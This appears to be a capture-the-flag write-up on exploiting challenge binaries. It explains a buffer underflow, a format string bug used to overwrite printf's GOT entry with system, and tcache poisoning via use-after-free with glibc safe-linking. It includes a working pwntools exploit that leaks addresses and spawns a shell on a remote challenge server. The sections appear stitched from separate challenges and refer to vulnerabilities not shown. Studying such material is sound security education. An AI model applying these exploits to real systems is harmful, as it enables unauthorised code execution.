#### Buffer underflow vulnerability:

Buffer underflow vulnerability:

Since we are able to write into the memory address of a negative offset from the employee memory address and that the admin variable is stored at a lower memory address than the employee array, with some calculation of the right offset, I will be able to overwrite the “root” string to “saturyay”, reaching the `win()` function.

Caculating the right offset:

```
Address        Variable       Value
─────────────────────────────────────
0x4080         admin      →   "root"
0x4088         (padding)
...
0x40A0         employees[0] → "jeff"
0x40A8         employees[1] → "anderson"
0x40B0         employees[2] → "elgato"
0x40B8         employees[3] → "sahur"
```

Calculation:

- Each index incremented/decremented moves the pointer by 8 bytes
- The admin pointer is `0x40A0 - 0x4088 = 0x20` or 32 bytes away from employees pointer at index 0
- As a result, a total of 32 bytes or 4 indexes has to be decremented to write to the admin pointer

### Vulnerabilities within the Program

#### Format String Vulnerability:

printf vulnerability:

```c
  printf("What do you say: ");
  __isoc99_scanf("%128s", format);
  puts("The bell tolls...");
  printf(format);
  printf("\nRespond to the toll: ");
  __isoc99_scanf("%128s", format);
  puts("The bell tolls yet again...");
  printf(format);
  printf("\nAppease the bell: ");
  __isoc99_scanf("%128s", format);
  printf(format);
```

Analysis:

- The user input `format` is parsed through `printf` without a format string `%s`
- This is a massive red flag, since format string vulnerability can leak memory like stack addresses or perform arbitrary write into memory

format string vulnerability:

```c
// VULNERABLE
printf(format);
```

Analysis:

- The format string’s purpose is to instruct `printf` to read or write data (based on which type of format string) from places it expects arguments to be like the stack or registers
- In this case, printf expects an argument, but does not specify a format string, hence an attacker can input a format string and cause `printf` to perform undefined behaviour
- If the caller didn’t pass the arguments, the `va_arg` logic still reads memory (or the register save area) as if values were there. It therefore reads unrelated values: return addresses, saved registers, pointers, etc.

Table of format strings and what they do:

```
%p — prints an argument as a pointer (address). Good, safe leak.

%x / %lx / %llx — print integer words in hex (use size modifier to match platform).

%s — reads an argument as a char * and dereferences it to print the string at that address (can crash if address invalid, but can leak memory content).

%c — reads an int and prints its low byte as a character.

%d / %i — read signed integer.

%u — unsigned integer.

%n — writes the number of bytes printed so far into the pointed-to integer argument (powerful write primitive; very dangerous for exploitation).
```

#### Arbitrary write to Global Offset Table:

Vulnerability inspiration:

[https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html](https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html)

Arbitrary write into GOT using format string vulnerability:

Using the `%n` flag with printf, we can actually write to memory. Since RELRO isn't enabled, we can write to the GOT table

Global offset table:

- Runtime table used by dynamic ELF binaries to hold addresses of functions
- GOT is an array of pointers in memory that hold the actual runtime memory addresses of imported functions/data symbols (eg. `printf`, `gets`, `puts`) from libc library

Loading functionality in linux:

- The ELF `PT_INTERP` field tells the kernel which dynamic loader/interpreter (e.g. `/lib64/ld-linux-x86-64.so.2`) to run.
- The loader locates and `mmap()`s the required shared objects (those named in `DT_NEEDED`, e.g. `libc.so.6`), then reads relocation records and resolves undefined symbols to addresses inside the mapped libraries.
- The loader (or the PLT stubs on first use) writes the resolved addresses into GOT entries so the binary calls jump through those memory slots to reach the real library functions.

GOT view:


How the vulnerability works:

- Each function required by the program that is imported from the libc library has an entry in the GOT mapped to a memory address, which the binary calls jump through those memory slots to reach the real library functions.
- The format string vulnerability allows attacker to overwrite the memory address of a function called within the binary like `printf` with the memory address of another libc function of the attacker’s choice like `system`.
- This way the attacker can run arbitrary commands like a shell `/bin/sh` whenever `printf` is called, since the `printf` function is now mapped to `system` function’s memory address within the libc library

### Exploiting the binary

Exploit Structure:

Upon looking at the code, I noticed that `printf` gets called 3 times. Particularly, all 3 times the user can control the inputs. As a result, I decided to structure the exploit in a way that I can easily control the arguments being passed to `system`:

- Use the 1st instance to leak memory addresses
- Use the 2nd instance to overwrite the GOT
- Use the 3rd instance to pass `/bin/sh` to `system`

#### Overwriting mechanics:

The exploit overwrites the GOT entry for `printf` with the resolved address of `system` in the process’s mapped `libc`. After the overwrite, calls that go through the `printf` GOT slot will instead jump to `system`, allowing the attacker to execute `system()`.

Visual representation of GOT entry of `printf()`:

```
.got.plt:0000000000005018 off_5018        dq offset printf        ;
```

Overwrite the libc memory address stored at offset `0x5018` (`printf`) with the libc memory address of `system`

#### Memory addresses required for the exploit:

Memory addresses:

1. GOT entry address for `printf` (where you overwrite)
    - Address of the GOT slot = `binary_base + printf_got_offset`
        - `binary_base` is the virtual base where the executable is mapped (for non‑PIE typically `0x400000` or, in your run, `0x555555554000` etc.).
        - `printf_got_offset` is the offset of the `printf` GOT entry inside the binary (not the `printf` function offset).
    - The GOT slot (that address) contains a pointer. After `printf` is resolved it will contain `libc_printf_addr` (an address inside libc). That pointer is what you overwrite.
2. Libc address for `system` (what you write into the GOT slot)
    - Address of `system` = `libc_base + system_offset`
        - `libc_base` is the virtual base where libc is mapped in the process
        - `system_offset` is the offset of `system` inside that specific libc build (use the same libc version).

#### Leaking memory address with GDB:

- Since ASLR is enabled for the binary itself, the memory addresses of both the GOT entry for `printf` and the Libc function `system` are both calculated by taking `randomized base address + fixed offset`, where randomized base address is unique for each runtime instance

Solution? GDB!

Using a format‑string `%p` infoleak under GDB (ASLR off) to find the stack index of a leaked pointer, then reuse that index with ASLR on to recover the randomized libc and  binary’s base address to compute the GOT entry address for `printf` and libc address for `system`.

#### Proof of Concept:

Note that I built the PoC with some help with claude 🙂

Proof of concept:

```python
#!/usr/bin/env python3                                     
from pwn import *                                                                                                     
import re                                                  
                                                           
# ===== SETUP =====                                        
elf = context.binary = ELF('./chal')
libc = ELF('./libc.so.6')                                  
                                                           
# ===== CONNECTION =====
if args.LOCAL:                                                                                                        
    p = process('./chal')                                  
else:
    p = remote('chal1.gryphons.sg', 10000)
                             
# ===== PHASE 1: LEAK BOTH ADDRESSES AT ONCE =====
p.recvuntil(b"What do you say: ")
                             
# Send both leaks in one payload with delimiters
p.sendline(b"LIBC:%25$p:BINARY:%27$p")
                             
received = p.recvuntil(b"Respond to the toll: ")
log.info(f"Received: {received}")      
print(received.decode())                                   
                                                           
# Parse with regex
libc_match = re.search(rb'LIBC:(0x[0-9a-fA-F]+)', received) 
binary_match = re.search(rb'BINARY:(0x[0-9a-fA-F]+)', received)          

if libc_match and binary_match:
    leaked_libc = int(libc_match.group(1), 16)
    leaked_binary = int(binary_match.group(1), 16)
    
    libc_base = leaked_libc - 0x29d90
    binary_base = leaked_binary - 0x1414
    
    log.success(f"Leaked libc: {hex(leaked_libc)}")
    log.success(f"libc base: {hex(libc_base)}")
    log.success(f"Leaked binary: {hex(leaked_binary)}")
    log.success(f"Binary base: {hex(binary_base)}")
else:
    log.error("Failed to leak addresses!")
    exit(1)

# ===== PHASE 2: CALCULATE TARGET ADDRESSES =====
# Calculate system address in libc
system_offset = libc.symbols['system']  # Use libc.so.6 offset
system_addr = libc_base + system_offset
log.info(f"system offset: {hex(system_offset)}")
log.success(f"system address: {hex(system_addr)}")

# Calculate printf@GOT address in binary
printf_got_offset = elf.got['printf']  # Use actual offset from binary
printf_got_addr = binary_base + printf_got_offset
log.info(f"printf@GOT offset: {hex(printf_got_offset)}")
log.success(f"printf@GOT address: {hex(printf_got_addr)}")

# ===== PHASE 4: OVERWRITE puts@GOT WITH system =====
offset = 6  # Format string offset

payload = fmtstr_payload(offset, {printf_got_addr: system_addr}, write_size='short')
log.info(f"Payload length: {len(payload)}")

p.sendline(payload)
print(payload)

try:
    p.sendline(b"/bin/sh")
    p.interactive()
except:
    pass
```

### Exploiting the binary:

Taking into account the UAF vulnerability, the heap memory address leak vulnerability and the memory address leak of the admin password, I noticed that a tcache poisoning attack can be performed.

#### Introduction to Tcache:

Tcache is a structure that is organized by size, where freed heaps of the same size are stored. The purpose of a Tcache is to maintain a cache of recently freed blocks of heap memory such that the memory addresses can easily be reused by the program for future reallocation of the same size of heap memory.

Characteristics of Tcache:

- Organized by size (separate bin for each size: 0x20, 0x30, ..., 0x80, etc.)
- Each bin is a singly-linked list
- LIFO (Last In, First Out)

The bin size of the Tcache in this instance is `0x80` bytes due to frequent allocation and freeing operations being performed on employee instances which are `0x80` bytes each. The structure would look similar to this:

```
tcache[0x80]:
  head → [Chunk A] → [Chunk B] → [Chunk C] → NULL
         (fd=B)      (fd=C)      (fd=NULL)
```

The program only stores the HEAD pointer to the linked list of heap chunks:

```c
// Simplified tcache structure
struct tcache_bin {
    void *head;        // Only stores the HEAD pointer
    int count;         // Number of chunks in this bin
};
```

#### Tcache poisoning due to UAF vulnerability:

Due to the UAF vulnerability present, users are able to read and write to freed chunks of heap memory, which are located in the tcache bin. This leads to a massive vulnerability of tcache poisoning. 

The dangling pointer allows attackers to modify the `fd` attribute of each node (representing a chunk of heap memory) within the linked list.

#### Tcache poisoning → Arbitrary write into the s2 variable

Seeing as the `fd` attribute can be modified, the motivation behind the tcache poisoning is to:

1. Free 2 chunks of heap memory. 
    
    ```
    State 1: Initial Heap
    ┌──────────────────────────────────────────┐
    │ employees[1] → [Heap Chunk 0x80 bytes]   │
    │ employees[0] → [Heap Chunk 0x80 bytes]   │
    └──────────────────────────────────────────┘
    
    State 1b: After Freeing (LIFO order)
    ┌──────────────────────────────────────────┐
    │ tcache[0x80]:                            │
    │   head → employees[1] → employees[0]     │
    │          (victim)       (filler)         │
    └──────────────────────────────────────────┘
    ```
    
2. Poison the `fd` attribute of the second chunk of heap memory such that instead of pointing to the first chunk of heap memory, point to the memory address of `s2` where the password is being stored
    
    ```
    State 2: After Poisoning (UAF write)
    ┌──────────────────────────────────────────┐
    │ tcache[0x80]:                            │
    │   head → employees[1] → s2 ← POISONED!   │
    │          (victim)                        │
    └──────────────────────────────────────────┘
    ```
    
3. Allocate 1 chunk of heap memory. The process keeps track of head of the tcache bin, which now point to the `fd` attribute of the second chunk of heap memory. Since we poisoned the `fd` attribute, it now holds the memory address of `s2`, which stores the password, rather than the memory address of the first chunk of heap memory as intended
    
    ```
    State 3: First Allocation
    ┌──────────────────────────────────────────┐
    │ add_employee(j1, "dummy")                │
    │ → Returns victim chunk (normal)          │
    │ → tcache head now points to s2!          │
    │                                          │
    │ tcache[0x80]:                            │
    │   head → s2                              │
    └──────────────────────────────────────────┘
    ```
    
4. When `add_employee` calls `malloc`, the allocator retrieves `s2` from the tcache as the next available chunk. This empties the tcache bin. Because `malloc` returns the `s2` address where the secret password is stored as a regular employee heap chunk, we gain read/write access to this memory region. This allows us to overwrite the password at `s2` with any arbitrary value we control.
    
    ```
    State 4: Second Allocation (THE EXPLOIT!)
    ┌──────────────────────────────────────────┐
    │ add_employee(j2, "KKKK...")              │
    │ → Returns s2 as if it's a heap chunk!    │
    │ → strncpy writes into s2[0:32]           │
    │ → Password overwritten with "KKKK..."    │
    └──────────────────────────────────────────┘
    ```
    
5. Now, bypassing the password check is trivial, as we have full knowledge of the password since we performed the overwrite with our own arbitrary 16 byte string.

#### Safe-linking:

One of the caveats to the solution above is the concept of safe-linking. 
Safe-linking is a **security mitigation** introduced in **glibc 2.32** to make tcache and fastbin poisoning attacks more difficult. It protects the forward pointer (`fd`) in freed chunks from simple corruption.

Checking glibc version:

```bash
└─$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Debian GLIBC 2.36-9) stable release version 2.36.
```

Analysis:

- This means that safe-linking is on

How does safe-linking make it harder to perform tcache poisoning:

- Safe-linking obfuscates the `fd` pointer using XOR with a value derived from the chunk's address (eg.`safe_fd = fd_pointer ^ (chunk_address >> 12)`)
- This means that merely poisoning the `fd` attribute with `s2's` memory address will not work, now require the current `chunk_address` in order to craft a valid `safe_fd` in order to poison the `fd` attribute

Before safe-linking:

```
State 2: After Poisoning (UAF write)

│   head → employees[1] → s2 ← POISONED!   │
│          (victim)                        │
└──────────────────────────────────────────┘
```

After safe-linking:

```
State 2: After Poisoning (UAF write)
┌──────────────────────────────────────────┐
│ tcache[0x80]:                            │
│   head → employees[1] → safe_fd          │
│          (victim)                        │

```
